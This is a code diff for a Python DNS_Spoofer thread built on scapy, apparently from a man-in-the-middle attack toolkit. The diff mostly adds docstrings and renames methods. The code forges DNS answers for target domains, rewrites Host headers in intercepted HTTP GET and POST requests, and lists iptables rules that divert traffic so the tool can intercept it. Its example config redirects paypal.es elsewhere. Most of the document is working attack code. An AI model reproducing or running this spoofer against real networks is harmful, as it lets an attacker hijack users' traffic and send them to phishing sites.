@@ -4,22 +4,44 @@ from scapy.all import *
 from src import files, packet_utilities
 from src.log import log
 
-
-
+#TODO: CAMBIAR LO QUE HAY POR GETHOST EN EL HANDLE HTTP PACKET
+#TODO: CAMBIAR LISTAS POR TUPLAS EN LAS REDIRECTS
 
 class DNS_Spoofer(threading.Thread):
-    #Thread that gets every DNS packet and answers or forwards it. If the domain is one of the targets,
-    #it answers the DNS query with the desired IP. If not, it simply forwards it.
-    #IP Forwarding must be deactivated in port 53, because this thread is the one which forwards or not those packets.
+    """Thread of the DNS Spoofing module.
+    
+    Sniffs every DNS packet and every HTTP post and get request. If the host 
+    asked is one of the targets, a spoofed packet with the desired host is 
+    created and sent. 
+    This way, DNS queries with target domain are answered with the spoofed IP, 
+    and HTTP requests with target hosts are forwarded with the spoofed host.
+    
+    Iptables rules needed:
+        iptables -A FORWARD -p udp --dport 53 -j DROP
+        iptables -A FORWARD -p tcp --dport 80 -m string --string 'POST' --algo
+            bm -m string --string 'GET' --algo bm -j DROP
+    """
     
     def __init__(self, exit_event, file_loc, timeout):
+        """Creates the thread.
+        
+        Parameters:
+            exit_event (threading.Event): the event that will be checked to
+                finish the thread and so the DNS Spoofing attack.
+            file_loc (str): the location of the file which contains the target
+                domains and the ip or domain they should be redirected to.
+            timeout (int, None): the time in seconds of the duration of the
+                attack. If None, it will last until CTRL-C is pressed.
+            As a Thread, it can also have any of a thread parameters. See
+            help(threading.Thread) for more help.
+        """
         super().__init__()
         self.exit_event = exit_event
         self.timeout = timeout
         self.handled_http_packets = []
         
         parsed_redirects = files.parse_domains_and_ips(file_loc)
-        self.parsed_redirects, self.default = self.resolve_parsed_redirects(parsed_redirects)
+        self.parsed_redirects, self.default = self._resolve_parsed_redirects(parsed_redirects)
         
         #FILE
         #* example.com
@@ -30,19 +52,47 @@ class DNS_Spoofer(threading.Thread):
         #default=                           ["93.184.216.34", "example.com"]
         
     
-    def resolve_parsed_redirects(self, redirects):
-        #FILE
-        #* example.com
-        #paypal.es pokexperto.net
-        #padventures.org 192.168.191.120
+    def _resolve_parsed_redirects(self, redirects):
+        """Resolves the domains of the dictionary, changes its structure and 
+        returns it and the default redirect.
         
-        #Parsed=                    {"*": "example.com", "paypal.es":"pokexperto.net", "padventures.org": "192.168.191.120"}
-        
+        Parameters:
+            redirects (dictionary): a redirects dictionary which structure is
+                the following: keys are domains that will redirected, and 
+                values are the domains or the ips that each key will be 
+                redirected to. It is usually given by the function
+                files.parse_domains_and_ips
+                
+        Returns:
+            tuple: a tuple which contains the redirects dictionary and a list
+                with the default redirect. The redirects_dictionary structure
+                is now:
+                    {domain_redirected:[ip_to_redirect, domain_to_redirect],..}
+                and the default redirect is now:
+                    [ip_to_redirect, domain_to_redirect]
+                
+        Examples:
+            FILE READ BY files.parse_domains_and_ips
+                * example.com
+                paypal.es pokexperto.net
+                padventures.org 192.168.191.120
+            
+            DICTIONARY RETURNED FROM files.parse_domains_and_ips
+                {"*": "example.com", "paypal.es":"pokexperto.net", 
+                    "padventures.org": "192.168.191.120"}
+            
+            TUPLE RETURNED FROM DNS_Spoofer._resolve_parsed_redirects
+                (redirect_dictionary, default_redirect)
+                
+            WHERE redirect_dictionary IS
+                {"paypal.es": ["45.60.23.55", "pokexperto.net"], "padventures.org":
+                    ["192.168.191.120", None]}
+                    
+            WHERE default_redirect IS
+                ["93.184.216.34", "example.com"]
+                
+        """
         #Redirect before default=   {"*": ["93.184.216.34", "example.com"], "paypal.es": ["45.60.23.55", "pokexperto.net"], "padventures.org": ["192.168.191.120", None]}
-        
-        #Redirect=                  {"paypal.es": ["45.60.23.55", "pokexperto.net"], "padventures.org": ["192.168.191.120", None]}
-        #Default=                   ["93.184.216.34", "example.com"]
-        
         
         new_redirects = {}
         
@@ -69,11 +119,23 @@ class DNS_Spoofer(threading.Thread):
         return new_redirects, default
 
             
-    def get_redirect_for_domain(self, domain_queried):
-        #Decides if a DNS Query or HTTP GET packet should be answered or just forwarded, 
-        #depending on wether the domain asked is one of the targets or not. If it should 
-        #be answered, it returns [IP_redirect, domain_redirect] the domain should be redirected 
-        #to. Note that domain_redirect can be None. If it should not be answered, it returns False.
+    def _get_redirect_for_domain(self, domain_queried):
+        """Decides if a DNS Query or HTTP request should be answered or not.
+        
+        It is decided depending on whether the domain asked is one of the 
+        targets or not. If it should be answered, it returns 
+        [IP_to_redirect, domain_to_redirect]. If it should not be answered, it
+        simply returns False.
+        
+        Parameters:
+            domain_queried (str): the domain that the dns query or the http
+                request is asking for.
+                
+        Returns:
+            list: a list which contains [IP_to_redirect, domain_to_redirect].
+                Note that domain_redirect can be None.
+            False: if the domain should not be spoofed.
+        """
         
         for d in self.parsed_redirects.keys(): #if it is an specific rule, it looks for it
             if d in domain_queried:
@@ -87,14 +149,34 @@ class DNS_Spoofer(threading.Thread):
         return self.default        
     
     
-    
-    def has_packet_been_handled(self, ack, seq, has_raw):
+    #This function is needed because when you send a packet, it can be sniffed by the
+    #running sniff function. As our own packets must not be handled, checking if they
+    #have already been handled is needed.
+    def _has_packet_been_handled(self, ack, seq, has_raw):
+        """Checks if a packet has been handled, depending on its ack number,
+        seck number and if it has raw layer. Note: this last one should be 
+        changed to tcp checksum as in JS.
+        
+        Parameters:
+            ack (int): the ack number of the TCP packet.
+            seq (int): the seq number of the TCP packet.
+            has_raw (bool): True if the packet has raw layer, False otherwise.
+            
+        Returns:
+            bool: True if it has already been handled, False otherwise. 
+            """
         result = self.handled_http_packets.count([ack,seq,has_raw])
         
         return True if result > 0 else False
 
     
-    def forward_http_packet(self, packet):
+    def _forward_http_packet(self, packet):
+        """Creates a http packet according to the original packet and sends it.
+        
+        Parameters:
+            packet (scapy.packet.Packet): the packet that will be forwarded.
+        """
+        
         #print("forwarding get packet")
         p = IP(dst=packet["IP"].dst, src=packet["IP"].src)/ \
             TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
@@ -103,7 +185,15 @@ class DNS_Spoofer(threading.Thread):
         send(p, verbose=0)
     
     
-    def forward_spoofed_http_packet(self, packet, host, spoofed_host):
+    def _forward_spoofed_http_packet(self, packet, host, spoofed_host):
+        """Creates a spoofed http packet and sends it.
+        
+        Parameters:
+            packet (scapy.packet.Packet): original packet
+            host (str): the string that will be replaced by spoofed_host
+            spoofed_host (str): the string that will replace host
+        """
+        
         p = IP(dst=packet["IP"].dst, src=packet["IP"].src)/ \
             TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
             Raw(load=packet.load.replace(host.encode("utf-8"), spoofed_host.encode("utf-8")))
@@ -129,10 +219,7 @@ class DNS_Spoofer(threading.Thread):
             # ~ print("Performing solution 2, difference is now", diff)
             
             #SOL 3
-            agent = p.load[p.load.find(b"User-Agent: ")+12:p.load.find(b"\r\n", p.load.find(b"User-Agent:"))]
-
-            first_pos = p.load.find(b"User-Agent: ")+12
-            agent = p.load[first_pos:p.load.find(b"\r\n", first_pos)]
+            agent = packet_utilities.get_user_agents(p.load)
             #new_agent = b"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
             p.load = p.load.replace(agent, b"")
             
@@ -141,7 +228,19 @@ class DNS_Spoofer(threading.Thread):
                 log.dns.error("len", diff1=diff1, diff2=diff2)
         send(p, verbose=0)
     
-    def add_handled_packet(self, packet):
+    
+    def _add_handled_packet(self, packet):
+        """Adds a packet to the list of handled packets.
+        
+        It adds a list which contains the packet ack number, the packet seq 
+        number and a boolean according to if the packet has raw layer or not.
+        If this list is too large when a new packet is added (500+), first
+        480 elements are removed.
+        
+        Parameters:
+            packet (scapy.packet.Packet): handled packet
+        """
+        
         self.handled_http_packets.append([packet.ack, packet.seq, packet.haslayer("Raw")])
         #print(len(self.handled_http_packets))
         if len(self.handled_http_packets) > 500:
@@ -149,30 +248,47 @@ class DNS_Spoofer(threading.Thread):
             print("DNS handled http packets length exceeded 500. Cleaning to last 20...")
         
         
-    def handle_http_get_packet(self, packet):
+    def _handle_http_packet(self, packet):
+        """Handles a http packet.
+        
+        If the packet has not been handled before, depending on the asked host,
+        a spoofed packet is created and sent or the packet is simply forwarded.
+        
+        Parameters:
+            packet (scapy.packet.Packet): handled packet
+        """
+        
         try:
             a = packet.ack
         except AttributeError:
             packet.show()
-        if not self.has_packet_been_handled(packet.ack, packet.seq, packet.haslayer("Raw")):
-            self.add_handled_packet(packet)
+        if not self._has_packet_been_handled(packet.ack, packet.seq, packet.haslayer("Raw")):
+            self._add_handled_packet(packet)
             
             first_pos = packet.load.find(b"Host: ")+6
             host = packet.load[first_pos:packet.load.find(b"\r\n",first_pos)].decode("utf-8", "ignore")
             
-            spoofed_domain = self.get_redirect_for_domain(host)[1]
+            spoofed_domain = self._get_redirect_for_domain(host)[1]
             
             if spoofed_domain: #si el host pedido tiene una redireccion a otro dominio:
-                self.forward_spoofed_http_packet(packet, host, spoofed_domain)
+                self._forward_spoofed_http_packet(packet, host, spoofed_domain)
                 log.dns.info("http_request", host=host, spoofed_domain=spoofed_domain)
                 
             else:
                 #si no hay una ip asociada, o no hay un dominio asociada a esta ip,
-                self.forward_http_packet(packet)
+                self._forward_http_packet(packet)
         
     
-    def answer_dns_packet(self, packet, ip_redirect):
-        #Answers a DNS Query with the ip_redirect.
+    def _answer_dns_packet(self, packet, ip_redirect):
+        """Answers a DNS Query.
+        
+        It creates a spoofed DNS Answer to answer the query according to the
+        desired ip.
+        
+        Parameters:
+            packet (scapy.packet.Packet): DNS Query packet
+            ip_redirect (str): the IP that the answer will contain.
+        """
         
         # ~ answer = Ether(dst=packet["Ether"].src, src=packet["Ether"].dst, type=0x800)/ \
         answer = IP(id=0,src=packet["IP"].dst, dst=packet["IP"].src, flags="DF")/ \
@@ -189,8 +305,14 @@ class DNS_Spoofer(threading.Thread):
         # ~ answer.show2()
     
     
-    def forward_dns_packet(self, packet): 
-        #Forwards a DNS Packet.
+    def _forward_dns_packet(self, packet):
+        """Creates a DNS Packet according to the original packet and sends it.
+        
+        Parameters:
+            packet (scapy.packet.Packet): DNS packet. Note that this is not
+                necessarily a DNS Query.
+        """
+        
         
         pkt_redirect = IP(src=packet["IP"].src, dst=packet["IP"].dst)/ \
         UDP(sport=packet["UDP"].sport, dport=packet["UDP"].dport)/ \
@@ -202,12 +324,17 @@ class DNS_Spoofer(threading.Thread):
 
 
     
-    def handle_dns_packet(self, packet):
-        #Answers DNS Queries that asks for one of the target domains, and forwards every other DNS Packet.
+    def _handle_dns_packet(self, packet):
+        """Handles a DNS packet. 
         
-        #sudo iptables -A FORWARD -p udp --dport 53 -j DROP para que no haga forward del puerto 53
-        #sudo iptables -A INPUT -p udp --dport 53 -j DROP en mi pc
+        If the packet is a query that asks for one of the target domains, a
+        spoofed answer is sent with the desired IP address. If not, the packet
+        is simply forwarded.
         
+        Parameters:
+            packet (scapy.packet.Packet): DNS packet. Note that this is not
+                necessarily a DNS Query.
+        """
         
         if packet["DNS"].rcode != 0 or (packet.haslayer("Raw") and b"KISS" in packet.load): #si ha dado error, o es uno de mis paquetes, pafuera
             return
@@ -215,29 +342,43 @@ class DNS_Spoofer(threading.Thread):
         
         if not packet["DNS"].an: #si es un query (no lleva respuesta)
             domain_queried = packet["DNS"].qd.qname.decode("utf-8", "ignore")
-            ip_redirect = self.get_redirect_for_domain(domain_queried)[0]
+            ip_redirect = self._get_redirect_for_domain(domain_queried)[0]
             if ip_redirect:
                 log.dns.info("dns_query", domain_queried = domain_queried, ip_redirect = ip_redirect)
-                self.answer_dns_packet(packet, ip_redirect)
+                self._answer_dns_packet(packet, ip_redirect)
             else:
                 #no hacer forward a un paquete al que ya se le hizo forward
                 # ~ print("[DNS] DNS packet domain", domain_queried, "from", packet["IP"].src, "to", packet["IP"].dst, end="")
                 # ~ print("Type: answer. Forwarding...") if packet["DNS"].an else print("Type: query. Forwarding...")
 
-                self.forward_dns_packet(packet)
+                self._forward_dns_packet(packet)
             
             
-    def handle_packet(self, packet):
-        #if not self.has_packet_been_handled(packet.ack, packet.seq, packet.haslayer("Raw")):
+    def _handle_packet(self, packet):
+        """Handled every packet.
+        
+        If it is a DNS Packet, it calls _handle_dns_packet. Else, if it has
+        a Raw layer, it calls _handle_http_packet.
+        
+        Params:
+            packet (scapy.packet.Packet): the handled packet, which can be
+                a DNS Packet or a HTTP Packet.
+        """
+        #if not self._has_packet_been_handled(packet.ack, packet.seq, packet.haslayer("Raw")):
         if packet.haslayer("DNS"): #paquetes DNS
-            self.handle_dns_packet(packet)
+            self._handle_dns_packet(packet)
         elif packet.haslayer("Raw"):# and b"GET" in packet["Raw"].load:
-            self.handle_http_get_packet(packet)
+            self._handle_http_packet(packet)
         
             
             
     def run(self):
+        """Method representing the thread's activity. It is started when start
+        function is called.
         
+        It sniffes every DNS packet and every HTTP request packet and handles
+        them, deciding to spoof it or not.
+        """
         log.dns.info("start",timeout=self.timeout)
         
         try:
@@ -249,9 +390,9 @@ class DNS_Spoofer(threading.Thread):
         #          es un paquete DNS y es IP (hay algunos que son ICMP host redirect) o bien es tcp, y en la capa raw tiene GET o POST
             sniff(filter="udp or tcp",
                   lfilter = lambda x: ((x.haslayer("DNS") and x.haslayer("IP")) or (x.haslayer("TCP") and x.haslayer("Raw") and ((b"POST" in x["Raw"].load) or (b"GET" in x["Raw"].load)))),
-                  prn=self.handle_packet, store=False, timeout=self.timeout, stopperTimeout=3, stopper=self.exit_event.is_set)
+                  prn=self._handle_packet, store=False, timeout=self.timeout, stopperTimeout=3, stopper=self.exit_event.is_set)
                   
-            #sniff(filter="tcp", lfilter = lambda x: x.haslayer("Raw") and b"GET" in x["Raw"].load, prn=self.handle_dns_packet, store=False, timeout=self.timeout, stopperTimeout=3, stopper=self.exit_event.is_set)
+            #sniff(filter="tcp", lfilter = lambda x: x.haslayer("Raw") and b"GET" in x["Raw"].load, prn=self._handle_dns_packet, store=False, timeout=self.timeout, stopperTimeout=3, stopper=self.exit_event.is_set)
         except PermissionError as err:
             log.dns.error("permission_sniffing", err = err)
             
